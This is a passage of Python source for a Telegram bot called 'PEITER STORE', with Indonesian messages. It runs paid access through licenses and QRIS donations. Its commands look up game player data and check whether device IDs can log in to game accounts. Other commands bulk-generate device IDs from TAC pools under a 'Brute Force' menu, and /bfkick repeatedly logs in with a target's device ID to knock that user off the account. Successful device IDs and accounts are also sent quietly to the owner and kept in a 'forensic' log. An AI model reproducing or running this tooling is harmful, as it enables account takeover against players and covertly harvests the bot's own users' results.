            tg_send(cid, dn.format_mode_info(QRIS_CFG))
            return
        mode = parts[1].lower()
        if mode not in ("auto", "manual", "hybrid"):
            tg_send(cid, "❌ Mode: auto | manual | hybrid")
            return
        dn.set_donate_mode(QRIS_CFG, mode)
        tg_send(cid, f"✅ Mode donasi → <b>{mode.upper()}</b>")
    elif lower == "/donatepending":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not dn: tg_send(cid, "❌ OFF"); return
        pending = dn.list_pending()
        if not pending:
            tg_send(cid, "📭 Tidak ada donasi pending"); return
        txt = f"⏳ <b>Donasi Pending ({len(pending)})</b>\n\n"
        for pcid, p in pending.items():
            txt += (f"• <b>{p['username']}</b> — Rp {p['amount']:,}\n"
                    f"  🆔 <code>{pcid}</code>\n\n")
        tg_send(cid, txt)
    elif lower == "/donatestats":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not DONATION_TRACKER: tg_send(cid, "❌ OFF"); return
        tg_send(cid, dn.format_donate_stats(DONATION_TRACKER))
    elif lower == "/donatelist":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not DONATION_TRACKER: tg_send(cid, "❌ OFF"); return
        tg_send(cid, dn.format_donate_list(DONATION_TRACKER))
    elif lower == "/donaterewards":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not dn: tg_send(cid, "❌ OFF"); return
        tg_send(cid, dn.format_rewards_table())
    elif lower == "/donatecancel":
        if not dn: tg_send(cid, "❌ Donate OFF"); return
        active = dn.get_active_qris(cid)
        if not active:
            tg_send(cid, "❌ Tidak ada QRIS aktif"); return
        amount = active["amount"]
        msg_id = active["message_id"]
        dn.clear_qris(cid)
        tg_edit(cid, msg_id, dn.format_donate_cancelled(amount),
                dn.kb_qris_cancelled())
        tg_send(cid, "❌ Donasi dibatalkan")
    elif lower == "/donateclear":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not DONATION_TRACKER: tg_send(cid, "❌ OFF"); return
        if DONATION_TRACKER.clear():
            tg_send(cid, "🗑 Data donasi dihapus")
    elif lower.startswith("/setqris"):
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not QRIS_CFG: tg_send(cid, "❌ OFF"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            tg_send(cid, "❌ <code>/setqris QRIS_STRING</code>"); return
        qris_str = parts[1].strip()
        valid, msg = dn.validate_qris(qris_str)
        if not valid:
            tg_send(cid, f"❌ {msg}"); return
        QRIS_CFG.set("qris_static", qris_str)
        tg_send(cid, f"✅ QRIS disimpan!\n{msg}\n📏 Panjang: {len(qris_str)} char")
    elif lower.startswith("/setbank"):
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not QRIS_CFG: tg_send(cid, "❌ OFF"); return
        parts = cmd.split(maxsplit=3)
        if len(parts) < 3:
            tg_send(cid, "❌ <code>/setbank BANK NO_REK [NAMA]</code>"); return
        QRIS_CFG.update(bank_name=parts[1], bank_account=parts[2],
                        bank_holder=parts[3] if len(parts) > 3 else "")
        tg_send(cid, f"✅ Bank: {parts[1]} / {parts[2]}")
    elif lower.startswith("/setewallet"):
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not QRIS_CFG: tg_send(cid, "❌ OFF"); return
        parts = cmd.split(maxsplit=3)
        if len(parts) < 3:
            tg_send(cid, "❌ <code>/setewallet WALLET NO_HP [NAMA]</code>"); return
        QRIS_CFG.update(ewallet_name=parts[1], ewallet_number=parts[2],
                        ewallet_holder=parts[3] if len(parts) > 3 else "")
        tg_send(cid, f"✅ E-wallet: {parts[1]} / {parts[2]}")
    elif lower == "/testqris":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not QRIS_CFG: tg_send(cid, "❌ OFF"); return
        static_qris = QRIS_CFG.get("qris_static", "")
        if not static_qris:
            tg_send(cid, "❌ QRIS belum diset"); return
        dynamic = dn.make_dynamic_qris(static_qris, 1000)
        img_bytes = dn.qris_to_image_bytes(dynamic, 400)
        if img_bytes:
            files = {"photo": ("test_qris.png", img_bytes, "image/png")}
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                files=files,
                data={"chat_id": cid,
                      "caption": "🧪 <b>TEST QRIS</b>\nNominal: <b>Rp 1,000</b>",
                      "parse_mode": "HTML"},
                timeout=30)
        else:
            tg_send(cid, "❌ Gagal generate QRIS")
    elif lower == "/qrisinfo":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not QRIS_CFG: tg_send(cid, "❌ OFF"); return
        static_qris = QRIS_CFG.get("qris_static", "")
        if not static_qris:
            tg_send(cid, "❌ QRIS belum diset"); return
        info = dn.get_qris_info(static_qris)
        txt = (f"ℹ️ <b>QRIS Info</b>\n━━━━━━━━━━━━━━━\n"
               f"🏪 {info['merchant']}\n🏙 {info['city']}\n"
               f"📮 {info['postal']}\n💱 {info['currency']}\n"
               f"🌏 {info['country']}\n🆔 {info['nmid']}\n━━━━━━━━━━━━━━━")
        tg_send(cid, txt)

    elif lower.startswith("/lookup"):
        if not is_admin:
            ok, _, mx = check_limit(cid, "lookup")
            if not ok: tg_send(cid, "❌ Limit habis"); return
        parts = cmd.split()
        if len(parts) < 2: tg_send(cid, "/lookup ROLE_ID [ZONE]"); return
        try: rid = int(parts[1])
        except: tg_send(cid, "❌ Angka"); return
        zid = None
        if len(parts) >= 3:
            try: zid = int(parts[2].strip("[]"))
            except: pass
        tg_send(cid, f"🔍 Lookup {rid}...")
        def _do():
            r = lookup_player_data(rid, zone_id=zid)
            if r.get("status") == "success":
                pd = r["player_data"]
                txt = (f"🎯 <b>{pd.get('nickname')}</b>\n\n"
                       f"🆔 {rid} | 🌐 {zid or pd.get('server')}\n"
                       f"⭐ Lv.{pd.get('level')}\n🥇 {pd.get('current_rank')}\n"
                       f"🏆 {pd.get('high_rank')}\n"
                       f"👕 {pd.get('skin_count')} skins\n"
                       f"🦸 {pd.get('hero_count')} heroes\n"
                       f"🛡 V2L: {pd.get('v2l_status')}")
                if not is_admin: inc_limit(cid, "lookup", 1)
                forward_single_to_owner(cid, username, f"lookup_{rid}", rid, zid or 0, source="lookup")
                if NOTIF_STORE and NOTIF_STORE.get(cid):
                    tg_send(cid, "🔔 <b>Lookup selesai!</b>")
            else:
                txt = f"❌ {r.get('error')}"
            tg_send(cid, txt, kb_main(cid))
        threading.Thread(target=_do, daemon=True).start()
    elif lower.startswith("/valid"):
        if not is_admin:
            ok, _, mx = check_limit(cid, "valid")
            if not ok: tg_send(cid, "❌ Limit habis"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            tg_send(cid, "✅ Kirim Device ID", kb_valid()); return
        did = parts[1].strip()
        tg_send(cid, f"✅ Cek <code>{did[:40]}</code>...")
        def _do():
            acc, zid = GameLogin(did).run()
            if acc and zid:
                tg_send(cid, f"✅ <b>VALID</b>\n\n📱 <code>{did[:60]}</code>\n"
                             f"🆔 {acc}\n🌐 {zid}")
                save_valid_result(did, acc, zid)
                if not is_admin: inc_limit(cid, "valid", 1)
                forward_single_to_owner(cid, username, did, acc, zid, source="valid")
                if NOTIF_STORE and NOTIF_STORE.get(cid):
                    tg_send(cid, "🔔 <b>Cek valid selesai!</b>")
            else:
                tg_send(cid, f"❌ FAILED\n📱 <code>{did[:60]}</code>")
        threading.Thread(target=_do, daemon=True).start()
    elif lower.startswith("/ban"):
        if not is_admin: tg_send(cid, "🚫 Admin only"); return
        parts = cmd.split()
        if len(parts) < 2: tg_send(cid, "/ban DEVICE"); return
        did = parts[1]
        tg_send(cid, "🔍 Cek ban...")
        def _do():
            st, res = check_device_ban_silent(did)
            if st == "BANNED":
                tg_send(cid, f"🔴 BANNED\n\n<code>{res}</code>")
            elif st == "CLEAR":
                tg_send(cid, "✅ CLEAR")
            else:
                tg_send(cid, f"⚠️ UNKNOWN\n<code>{res}</code>")
        threading.Thread(target=_do, daemon=True).start()
    elif lower.startswith("/gendev"):
        if not is_admin: tg_send(cid, "🚫 Admin only"); return
        parts = cmd.split()
        n = 10; typ = "mixed"
        if len(parts) >= 2:
            try: n = max(1, min(BF_GEN_MAX, int(parts[1])))
            except: pass
        if len(parts) >= 3:
            t = parts[2].lower()
            if t in ("and","android"): typ = "and"
            elif t == "ios": typ = "ios"
        threading.Thread(target=do_gendev, args=(cid, n, typ), daemon=True).start()
    elif lower == "/exportcsv":
        if not is_admin: tg_send(cid, "🚫"); return
        threading.Thread(target=do_export_csv, args=(cid,), daemon=True).start()
    elif lower == "/exportjson":
        if not is_admin: tg_send(cid, "🚫"); return
        threading.Thread(target=do_export_json, args=(cid,), daemon=True).start()
    elif lower == "/zip":
        if not is_admin: tg_send(cid, "🚫"); return
        threading.Thread(target=do_zip, args=(cid,), daemon=True).start()
    elif lower == "/stopjob":
        stopped = job_stop(cid) or stop_job(cid)
        tg_send(cid, "⛔ Stopping..." if stopped else "❌ Tidak ada job")
    elif lower == "/pipeline":
        if not is_admin: tg_send(cid, "🚫"); return
        set_pending(cid, "pipeline")
        tg_send(cid, "🎬 Upload file .txt")
    elif lower in ("/bruteforce", "/bf"):
        if not is_admin: tg_send(cid, "🚫"); return
        tg_send(cid, "💥 <b>Brute Force</b>", kb_bf())
    elif lower.startswith("/bfgen"):
        if not is_admin: tg_send(cid, "🚫"); return
        parts = cmd.split()
        if len(parts) < 2: tg_send(cid, "/bfgen N TYPE"); return
        try: n = min(int(parts[1]), BF_GEN_MAX)
        except: tg_send(cid, "❌"); return
        typ = "mixed"
        if len(parts) >= 3:
            t = parts[2].lower()
            if t in ("and","android"): typ = "and"
            elif t == "ios": typ = "ios"
        threading.Thread(target=do_gendev, args=(cid, n, typ), daemon=True).start()
    elif lower.startswith("/bfkick"):
        if not is_admin: tg_send(cid, "🚫"); return
        parts = cmd.split()
        if len(parts) < 2: tg_send(cid, "/bfkick DEVICE [N] [DELAY]"); return
        did = parts[1]
        loops = BF_KICK_MAX_LOOPS; delay = BF_KICK_DELAY
        if len(parts) >= 3:
            try: loops = min(int(parts[2]), 1000)
            except: pass
        if len(parts) >= 4:
            try: delay = max(0.1, float(parts[3]))
            except: pass
        tg_send(cid, f"💥 Kick <code>{did[:50]}</code>\n🔁 {loops} | ⏱ {delay}s")
        def _kick():
            job_start(cid, "bfkick", loops)
            ok = 0; fail = 0
            for i in range(loops):
                if job_check(cid):
                    tg_send(cid, f"⛔ Stop di loop {i+1}"); break
                try:
                    rate_wait()
                    acc, zid = GameLogin(did).run()
                    if acc: ok += 1
                    else: fail += 1
                except: fail += 1
                job_update(cid, done=i+1)
                time.sleep(delay)
            job_end(cid)
            tg_send(cid, f"💥 Selesai: ✅ {ok} | ❌ {fail}")
        threading.Thread(target=_kick, daemon=True).start()
    elif lower.startswith("/adduser"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: tg_send(cid, "/adduser @user"); return
        tid = resolve_user(parts[1])
        if not tid: tg_send(cid, "❌ Tidak ketemu"); return
        grant_access(tid, "user", f"owner:{cid}")
        tg_send(cid, f"✅ User <code>{tid}</code>")
        tg_send(tid, "✅ Akses diberikan!\nKetik /menu")
    elif lower.startswith("/addadmin"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: tg_send(cid, "/addadmin @user"); return
        tid = resolve_user(parts[1])
        if not tid: tg_send(cid, "❌"); return
        grant_access(tid, "admin", f"owner:{cid}")
        tg_send(cid, f"✅ Admin <code>{tid}</code>")
        tg_send(tid, "🔧 Kamu admin!")
    elif lower.startswith("/deluser"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: return
        tid = resolve_user(parts[1])
        if tid: revoke_access(tid); tg_send(cid, f"✅ Dihapus {tid}")
    elif lower.startswith("/deladmin"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: return
        tid = resolve_user(parts[1])
        if tid: revoke_access(tid); tg_send(cid, f"✅ Admin dihapus {tid}")
    elif lower == "/listusers":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        users = list(_USER_ACCESS.keys())
        txt = f"👥 Users ({len(users)})\n\n"
        for u in users[:50]:
            txt += f"• <code>{u}</code> — {_USER_ACCESS[u].get('role','user')}\n"
        tg_send(cid, txt or "Kosong")
    elif lower == "/listadmins":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        admins = [u for u, info in _USER_ACCESS.items()
                  if info.get("role") in ("admin", "owner")]
        txt = f"🔧 Admins ({len(admins)})\n\n"
        for u in admins[:50]:
            txt += f"• <code>{u}</code> — {_USER_ACCESS[u].get('role','admin')}\n"
        tg_send(cid, txt or "Kosong")
    elif lower.startswith("/userinfo"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        if not ex: tg_send(cid, "❌ Extras OFF"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: tg_send(cid, "/userinfo @user|ID"); return
        target = parts[1].strip()
        tid = None
        if UNAME_STORE: tid = UNAME_STORE.resolve(target)
        if not tid: tid = resolve_user(target)
        if not tid and target.isdigit(): tid = target
        if not tid: tg_send(cid, "❌ Tidak ketemu"); return
        txt = ex.build_userinfo(tid, _USER_ACCESS, _USER_LIMITS, _BLOCKED_USERS, get_role)
        tg_send(cid, txt)
    elif lower.startswith("/setrole"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split()
        if len(parts) < 3:
            tg_send(cid, "/setrole @user ROLE\nRole: owner|admin|user|trial|guest"); return
        target = parts[1]; new_role = parts[2].lower()
        valid = ("owner","admin","user","trial","guest")
        if new_role not in valid:
            tg_send(cid, f"❌ Role invalid. Pilih: {', '.join(valid)}"); return
        tid = None
        if UNAME_STORE: tid = UNAME_STORE.resolve(target)
        if not tid: tid = resolve_user(target)
        if not tid and target.isdigit(): tid = target
        if not tid: tg_send(cid, "❌ Tidak ketemu"); return
        grant_access(tid, new_role, f"owner:{cid}")
        tg_send(cid, f"✅ <code>{tid}</code> → <b>{new_role.upper()}</b>")
        tg_send(tid, f"🎭 Role kamu: <b>{new_role.upper()}</b>")
    elif lower.startswith("/setlimit"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split()
        if len(parts) < 3: tg_send(cid, "/setlimit @user N"); return
        tid = resolve_user(parts[1])
        if not tid: return
        try: n = int(parts[2])
        except: return
        set_limit(tid, "lookup", n); set_limit(tid, "valid", n)
        set_limit(tid, "bulk", max(1, n//2))
        tg_send(cid, f"✅ Limit {tid} = {n}")
    elif lower.startswith("/resetlimit"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split()
        if len(parts) < 2: return
        tid = resolve_user(parts[1])
        if tid: reset_limit(tid); tg_send(cid, f"✅ Reset {tid}")
    elif lower == "/resetalllimit":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        for u in list(_USER_LIMITS.keys()): reset_limit(u)
        tg_send(cid, "✅ Reset semua")
    elif lower.startswith("/block"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: return
        tid = resolve_user(parts[1])
        if tid: _BLOCKED_USERS.add(tid); save_blocked(); revoke_access(tid)
        tg_send(cid, f"🚫 Blocked {tid}")
    elif lower.startswith("/unblock"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split()
        if len(parts) < 2: return
        tid = parts[1]
        if tid.startswith("@"): tid = resolve_user(tid)
        if tid: _BLOCKED_USERS.discard(tid); save_blocked()
        tg_send(cid, f"✅ Unblocked {tid}")
    elif lower == "/blocklist":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        txt = f"🚫 Blocked ({len(_BLOCKED_USERS)})\n"
        for u in list(_BLOCKED_USERS)[:50]: txt += f"• <code>{u}</code>\n"
        tg_send(cid, txt)
    elif lower.startswith("/broadcast"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: return
        bmsg = parts[1]
        def _bc():
            s = f = 0
            for u in list(_USER_ACCESS.keys()) + [OWNER_CHAT_ID]:
                if u == str(cid): continue
                if tg_send(u, f"📢 <b>Broadcast</b>\n\n{bmsg}"): s += 1
                else: f += 1
                time.sleep(0.05)
            tg_send(cid, f"✅ Sent: {s} Failed: {f}")
        threading.Thread(target=_bc, daemon=True).start()
    elif lower == "/logclear":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        try:
            (LOGS_DIR / "activity.log").write_text("", encoding="utf-8")
            tg_send(cid, "🗑 Log cleared")
        except Exception as e:
            tg_send(cid, f"❌ {e}")
    elif lower.startswith("/log"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        threading.Thread(target=do_show_log, args=(cid, 30), daemon=True).start()
    elif lower == "/debug":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        tg_send(cid, f"🧪 OS: {platform.system()}\nPython: {platform.python_version()}\n"
                     f"Uptime: {int(time.time()-_BOT_START_TIME)}s\n"
                     f"Mode: {PERFORMANCE_MODE}")
    elif lower == "/backup":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        threading.Thread(target=do_backup, args=(cid,), daemon=True).start()
    elif lower == "/cleanup":
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        threading.Thread(target=do_cleanup, args=(cid,), daemon=True).start()
    elif lower == "/version":
        tg_send(cid, "📦 PEITER ULTIMATE\nv10 OPTIMIZED")
    elif lower == "/about":
        tg_send(cid, "🎯 PEITER STORE\nUltimate Edition v10\nLive Progress + Fast")
    elif lower.startswith("/setmode"):
        if not is_owner: tg_send(cid, "🚫 Owner"); return
        parts = cmd.split()
        if len(parts) < 2: tg_send(cid, "/setmode aggressive|balanced|safe"); return
        m = parts[1].lower()
        if m not in PERF_PROFILES: tg_send(cid, "❌ Mode invalid"); return
        PERFORMANCE_MODE = m; PROFILE = PERF_PROFILES[m]
        tg_send(cid, f"⚡ Mode → <b>{m.upper()}</b>")
    elif lower == "/license":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not lics: tg_send(cid, "❌ OFF"); return
        st = lics.stats()
        tg_send(cid, f"🔑 <b>License Manager</b>\n"
                     f"📦 Total: {st['total']} | ✅ {st['active']}\n"
                     f"⌛ {st['expired']} | ⛔ {st['disabled']} | 🔴 {st['exhausted']}",
                kb_license())
    elif lower.startswith("/genlicense"):
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not lics: tg_send(cid, "❌ License OFF"); return
        parts = cmd.split()
        rrole = parts[1].lower() if len(parts) >= 2 else "user"
        if rrole not in ("owner","admin","user","trial"): rrole = "user"
        dur_str = parts[2].lower() if len(parts) >= 3 else "24h"
        dur = lics.LICENSE_DURATIONS.get(dur_str, 24)
        max_uses = 1
        if len(parts) >= 4:
            try: max_uses = int(parts[3])
            except: max_uses = 1
        r = lics.create_license(role=rrole, duration_hours=dur,
                                max_uses=max_uses, created_by=str(cid))
        exp = "♾ PERMANEN"
        if r["expires_at"]:
            exp = datetime.fromtimestamp(r["expires_at"], TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
        tg_send(cid, f"🔑 <b>LICENSE BARU</b>\n"
                     f"🔐 <code>{r['key']}</code>\n"
                     f"🎭 {r['role'].upper()}\n"
                     f"📅 {exp}\n"
                     f"👥 Max: {max_uses}\n\n"
                     f"User redeem: <code>/redeem {r['key']}</code>")
    elif lower.startswith("/redeem"):
        if not lics: tg_send(cid, "❌ License OFF"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: tg_send(cid, "❌ <code>/redeem KODE</code>"); return
        key = parts[1].strip().upper()
        ok, msg_, r, exp = lics.redeem_license(key, cid)
        if ok:
            grant_access(cid, role=r, granted_by=f"lic:{key}")
            exp_str = "♾ PERMANEN"
            if exp:
                exp_str = datetime.fromtimestamp(exp, TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
            tg_send(cid, f"{msg_}\n\n🎭 <b>{r.upper()}</b>\n📅 {exp_str}\n\nKetik /menu")
        else:
            tg_send(cid, msg_)
    elif lower == "/mylicense":
        if not lics: tg_send(cid, "❌ License OFF"); return
        my = lics.find_user_license(cid)
        if not my: tg_send(cid, "❌ Kamu belum punya license")
        else:
            exp = "♾ PERMANEN"
            if my.get("expires_at"):
                exp = datetime.fromtimestamp(my["expires_at"], TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
            tg_send(cid, f"🔐 <b>License Kamu</b>\n\n"
                         f"🔑 <code>{my['key']}</code>\n"
                         f"🎭 {my['role'].upper()}\n📅 {exp}")
    elif lower == "/listlicenses":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not lics: tg_send(cid, "❌ OFF"); return
        items = lics.list_licenses()
        if not items: tg_send(cid, "📭 Kosong"); return
        now = time.time()
        txt = f"🔑 <b>License ({len(items)})</b>\n\n"
        for lic in items[:30]:
            if not lic.get("enabled", True): st = "⛔"
            elif lic["expires_at"] and now > lic["expires_at"]: st = "⌛"
            elif lic["used_count"] >= lic["max_uses"]: st = "🔴"
            else: st = "✅"
            txt += f"{st} <code>{lic['key']}</code> — {lic['role']}\n"
        tg_send(cid, txt)
    elif lower.startswith("/revokelicense"):
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not lics: tg_send(cid, "❌ OFF"); return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2: tg_send(cid, "❌ <code>/revokelicense KEY</code>"); return
        if lics.revoke_license(parts[1]):
            tg_send(cid, f"✅ Revoked <code>{parts[1].upper()}</code>")
        else:
            tg_send(cid, "❌ Tidak ditemukan")
    elif lower == "/tacstats":
        if not is_owner:
            tg_send(cid, "🚫 Owner only")
            return
        if not TAC_POOL_ALL:
            tg_send(cid, "❌ TAC Pool OFF")
            return
        tg_send(cid,
                f"📊 <b>TAC POOL STATS</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🤖 Android: <b>{len(TAC_POOL_ANDROID)}</b> TAC\n"
                f"🍎 iOS: <b>{len(TAC_POOL_IOS)}</b> TAC\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📦 Total: <b>{len(TAC_POOL_ALL)}</b> TAC\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🔨 Generate pake: <code>/gendev N mixed</code>")
    elif lower == "/started":
        if not is_owner:
            tg_send(cid, "🚫 Owner only")
            return
        if not STARTED_TRACKER:
            tg_send(cid, "❌ StartedTracker OFF")
            return
        st = STARTED_TRACKER.stats()
        tg_send(cid,
                f"👥 <b>STARTED USERS</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📊 Total: <b>{st['total']}</b>\n"
                f"✅ Active: <b>{st['active']}</b>\n"
                f"🚫 Blocked: <b>{st['blocked']}</b>\n"
                f"📅 Last 24h: <b>{st['last_24h']}</b>\n"
                f"📆 Last 7d: <b>{st['last_7d']}</b>")

    elif lower == "/startedlist":
        if not is_owner:
            tg_send(cid, "🚫 Owner only")
            return
        if not STARTED_TRACKER:
            tg_send(cid, "❌ OFF")
            return
        users = STARTED_TRACKER.get_all()
        if not users:
            tg_send(cid, "📭 Kosong")
            return
        txt = f"👥 <b>List ({len(users)})</b>\n\n"
        for u in users[:50]:
            emoji = "🚫" if u.get("blocked") else "✅"
            uname = f"@{u.get('username_tg')}" if u.get("username_tg") else u.get("first_name", "?")
            txt += f"{emoji} <code>{u['cid']}</code> — {uname}\n"
        if len(users) > 50:
            txt += f"\n<i>... +{len(users)-50} lainnya</i>"
        tg_send(cid, txt)

    elif lower.startswith("/startedbc"):
        if not is_owner:
            tg_send(cid, "🚫 Owner only")
            return
        if not STARTED_TRACKER:
            tg_send(cid, "❌ OFF")
            return
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            tg_send(cid, "❌ <code>/startedbc PESAN</code>")
            return
        bmsg = parts[1]
        total = STARTED_TRACKER.count()
        tg_send(cid, f"📢 Broadcasting ke <b>{total}</b> user...")

        def _bc():
            success, fail, blocked_new = broadcast_to_started(
                STARTED_TRACKER, bmsg, tg_send,
                delay=0.35, skip_blocked=True
            )
            tg_send(cid,
                    f"📢 <b>Broadcast Selesai</b>\n"
                    f"✅ Terkirim: <b>{success}</b>\n"
                    f"❌ Gagal: <b>{fail}</b>\n"
                    f"🚫 Blocked: <b>{blocked_new}</b>")
        threading.Thread(target=_bc, daemon=True).start()

    elif lower == "/fwdstats":
        if not is_owner: return
        try:
            lines = FORENSIC_FILE.read_text(encoding="utf-8", errors="ignore").splitlines()
            tg_send(cid, f"📊 Forward log: {len(lines)} entries")
        except: tg_send(cid, "Kosong")
    elif lower.startswith("/fwdlog"):
        if not is_owner: return
        try:
            lines = FORENSIC_FILE.read_text(encoding="utf-8", errors="ignore").splitlines()
            last = lines[-20:]
            txt = "📜 <b>Forensic</b>\n\n<pre>" + "\n".join(l[:150] for l in last) + "</pre>"
            tg_send(cid, txt)
        except: pass
    elif lower == "/last":
        if not is_owner: return
        try:
            lines = FORENSIC_FILE.read_text(encoding="utf-8", errors="ignore").splitlines()
            last = [json.loads(l) for l in lines[-10:] if l.strip()]
            txt = "📜 10 terakhir\n\n"
            for e in last:
                txt += f"[{e.get('ts','?')[11:19]}] {e.get('type','?')} {e.get('alias','?')}\n"
            tg_send(cid, txt)
        except: pass
    elif lower == "/today":
        if not is_owner: return
        try:
            today = now_wib().strftime("%Y-%m-%d")
            lines = FORENSIC_FILE.read_text(encoding="utf-8", errors="ignore").splitlines()
            cnt = sum(1 for l in lines if today in l and "batch_valid" in l)
            tg_send(cid, f"📅 Today batch: {cnt}")
        except: pass
    else:
        tg_send(cid, f"❓ Unknown: <code>{text[:50]}</code>\n\n/help")

print("[BOOT] Bagian 10/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  BOT POLLING
# ══════════════════════════════════════════════════════════════════
def bot_poll():
    global _BOT_LAST_UPDATE, PERFORMANCE_MODE, PROFILE
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"

    # ── Notif startup ke OWNER ──
    startup_msg = (
        f"🚀 <b>PEITER STORE ONLINE</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"⚡ Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
        f"🔧 Workers: <b>{PROFILE.get('valid_w', 80)}</b>\n"
        f"🚀 Live Progress: <b>ON</b>\n"
        f"💰 Donate: <b>{'ON' if dn else 'OFF'}</b>\n"
        f"🔑 License: <b>{'ON' if lics else 'OFF'}</b>\n"
        f"⚙️ Extras: <b>{'ON' if ex else 'OFF'}</b>\n"
        f"🎨 Output: <b>Rapih (auto-number)</b>\n"
        f"🕒 {now_wib().strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"✅ Bot siap menerima perintah"
    )

    try:
        tg_send(OWNER_CHAT_ID, startup_msg)
    except: pass

    # ── Notif startup ke SEMUA user yang punya akses ──
    try:
        sent_count = 0
        for uid in list(_USER_ACCESS.keys()):
            if uid == str(OWNER_CHAT_ID):
                continue
            role = _USER_ACCESS[uid].get("role", "user")
            role_emoji = {
                "owner": "👑", "admin": "🔧",
                "user": "👤", "trial": "🧪", "guest": "👻"
            }.get(role, "👤")
            try:
                tg_send(uid, f"{role_emoji} <b>Bot Online</b>\n"
                             f"━━━━━━━━━━━━━━━\n"
                             f"👋 Halo, bot udah nyala lagi\n"
                             f"⚡ Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
                             f"🕒 {now_wib().strftime('%H:%M:%S WIB')}\n"
                             f"━━━━━━━━━━━━━━━\n"
                             f"Ketik /menu untuk mulai 🚀")
                sent_count += 1
                time.sleep(0.3)
            except Exception:
                continue
        safe_print(f"[BOT] Startup notif sent to {sent_count} users")
    except Exception as e:
        safe_print(f"[BOT] Startup notif error: {e}")

    # ── Notif ke semua user yang pernah /start ──
    if STARTED_TRACKER:
        try:
            total_users = STARTED_TRACKER.count()
            safe_print(f"[BOT] Broadcasting startup to {total_users} started users...")

            user_msg = (
                f"🔔 <b>BOT ONLINE</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"👋 Halo, bot udah nyala lagi\n"
                f"⚡ Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
                f"🕒 {now_wib().strftime('%H:%M:%S WIB')}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"Ketik /menu untuk mulai 🚀"
            )

            def _broadcast():
                try:
                    success, fail, blocked_new = broadcast_to_started(
                        STARTED_TRACKER, user_msg, tg_send,
                        delay=0.35, skip_blocked=True
                    )
                    safe_print(f"[BOT] Startup notif: OK {success} | X {fail} | BLOCKED {blocked_new}")
                    try:
                        tg_send(OWNER_CHAT_ID,
                                f"📢 <b>Startup Broadcast Report</b>\n"
                                f"✅ Terkirim: <b>{success}</b>\n"
                                f"❌ Gagal: <b>{fail}</b>\n"
                                f"🚫 Blocked: <b>{blocked_new}</b>\n"
                                f"👥 Total: <b>{total_users}</b>")
                    except: pass
                except Exception as e:
                    safe_print(f"[BOT] Broadcast error: {e}")

            threading.Thread(target=_broadcast, daemon=True).start()
        except Exception as e:
            safe_print(f"[BOT] Started broadcast error: {e}")

    # ── Set commands (SEKALI AJA) ──
    try:
        requests.post(f"{base}/setMyCommands", json={"commands": [
            {"command": "menu", "description": "📋 Menu"},
            {"command": "help", "description": "❓ Bantuan"},
            {"command": "status", "description": "📊 Status"},
            {"command": "myid", "description": "👤 Profil"},
            {"command": "mylimit", "description": "📊 Limit"},
            {"command": "notif", "description": "🔔 Notif on/off"},
            {"command": "lookup", "description": "🎯 Lookup"},
            {"command": "valid", "description": "✅ Cek valid"},
            {"command": "stats", "description": "📈 Statistik"},
